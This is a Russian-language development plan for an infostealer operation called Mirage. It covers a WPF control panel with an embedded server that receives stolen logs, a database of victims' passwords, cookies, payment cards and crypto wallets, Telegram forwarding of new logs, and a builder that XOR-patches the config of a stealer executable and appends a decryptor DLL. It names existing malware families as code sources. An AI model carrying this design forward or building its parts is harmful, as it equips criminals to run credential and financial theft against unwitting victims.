# Phase 6: Panel + Builder — План реализации

## Архитектура

Единое WPF-приложение (.NET 10) с встроенным ASP.NET Core сервером и вкладкой Builder.
Builder НЕ отдельный WinForms проект — это `Views/BuildPage.xaml` внутри Panel.

```
Mirage.Panel.exe
├── ASP.NET Core Server (self-hosted, loopback + random port)
│   ├── POST /api/log — приём логов от стилера
│   ├── GET /api/stats — статистика для дашборда
│   └── GET /api/search?q= — полнотекстовый поиск
├── WPF UI (MaterialDesign Dark theme)
│   ├── DashboardPage — статистика + графики
│   ├── SessionsPage — таблица сессий
│   ├── SessionDetailPage — данные сессии
│   ├── BuildPage — билдер стилера (экс-WinForms)
│   ├── SearchPage — поиск по данным
│   └── SettingsPage — конфигурация
├── SQLite (EF Core)
│   ├── builds, sessions, passwords, cookies, cards
│   ├── wallets, files, system_info
│   └── LogProcessor — парсинг входящих ZIP → БД
├── Telegram Proxy — авто-форвард новых логов
└── Embedded Resources
    ├── Mirage.Stealer.exe — загружается для билда
    └── MirageDecryptor.dll — добавляется как overlay
```

## Референсы из raw/

| Компонент | Референс | Что берём |
|-----------|----------|-----------|
| **Country flags** | PhantomStealer `Flags.cs` / Stealerium `Flags.cs` | 250+ Unicode flag emoji для отображения стран |
| **Geo IP** | RedLine `GeoHelper.cs` | ip-api.com/geoplugin.net → страна + город |
| **TCP server** | Phemedrone `TcpServer.cs` | Pattern для приёма логов |
| **Console table** | Phemedrone `ConsoleTable.cs` | UI таблицы с сортировкой |
| **PE patching** | Umbral `Builder.cs` (Mono.Cecil) | IL-level замена `Ldstr` операндов |
| **Config XOR** | Blank-Grabber `process.py` | XOR encrypt config → patch .rdata |
| **Resource embed** | Phantom `ResourceManager.cs` | AES encrypt + embed resources |
| **SQLite storage** | Phemedrone `DatabaseWorker.cs` | SQLite schema design |
| **Dark theme** | MaterialDesignInXAML GitHub + Lemon.Template.Wpf | MaterialDesign3 Dark + BundledTheme |
| **Server embed** | WestWind blog + Microsoft docs | `WebApplication.CreateBuilder` внутри WPF |

## Файловая структура

```
Mirage.Panel/
├── Mirage.Panel.csproj
├── Program.cs
├── App.xaml / App.xaml.cs
├── MainWindow.xaml / MainWindow.xaml.cs
├── Services/
│   ├── PanelServer.cs          — ASP.NET Core host
│   ├── BuildService.cs         — PE patching + DLL overlay
│   ├── LogProcessor.cs         — ZIP → SQLite parser
│   └── TelegramProxy.cs        — Telegram bot listener
├── Controllers/
│   ├── LogController.cs        — POST /api/log
│   ├── StatsController.cs      — GET /api/stats
│   └── SearchController.cs     — GET /api/search
├── Data/
│   ├── AppDbContext.cs         — EF Core context
│   └── Migrations/
├── Models/
│   ├── Build.cs
│   ├── Session.cs
│   ├── Password.cs / Cookie.cs / Card.cs
│   ├── Wallet.cs / File.cs / SystemInfo.cs
│   └── LogEntry.cs
├── Views/
│   ├── DashboardPage.xaml
│   ├── SessionsPage.xaml
│   ├── SessionDetailPage.xaml
│   ├── BuildPage.xaml
│   ├── SearchPage.xaml
│   └── SettingsPage.xaml
├── Helpers/
│   ├── Flags.cs                — Country → flag emoji (из Phantom/Stealerium)
│   ├── GeoHelper.cs            — IP → страна (из RedLine)
│   └── Conversions.cs          — Timestamp, hex, format helpers
└── Resources/
    ├── Mirage.Stealer.exe      — Embedded для билда
    └── MirageDecryptor.dll     — Embedded для overlay
```

## Реализация

### Шаг 1: Project Setup + NuGet
```bash
dotnet new wpf -n Mirage.Panel --framework net10.0-windows
dotnet add package MaterialDesignThemes --version 5.3.1
dotnet add package LiveChartsCore.SkiaSharpView.Wpf
dotnet add package Microsoft.EntityFrameworkCore.Sqlite
dotnet add package CommunityToolkit.Mvvm
```

### Шаг 2: Dark theme (App.xaml)
```xml
<materialDesign:BundledTheme BaseTheme="Dark" PrimaryColor="DeepPurple" SecondaryColor="Lime"/>
```

### Шаг 3: ASP.NET Core server in WPF
```csharp
// PanelServer.cs — запускается из MainWindow
var builder = WebApplication.CreateBuilder();
builder.WebHost.UseUrls($"https://localhost:{port}");
// ... AddControllers, Auth, RateLimiting
var app = builder.Build();
await app.StartAsync(); // Non-blocking
```

### Шаг 4: Country flags (Flags.cs из PhantomStealer)
Словарь `CountryCode → Unicode flag emoji`. 250+ стран.
Используется в: SessionsPage (флаг рядом с IP), DashboardPage (карта).

### Шаг 5: Build page
Загрузка Stealer.exe как byte[] → поиск сигнатуры MIRAGECFG в .rdata → XOR encrypt config → overwrite → append MirageDecryptor.dll → output.

## Тестирование

- `dotnet build` — компиляция
- `dotnet test` — модульные тесты
- Запуск Panel.exe → открытие дашборда на localhost:{port}
- POST /api/log с тестовым ZIP → проверка БД
- Build → проверка выходного EXE
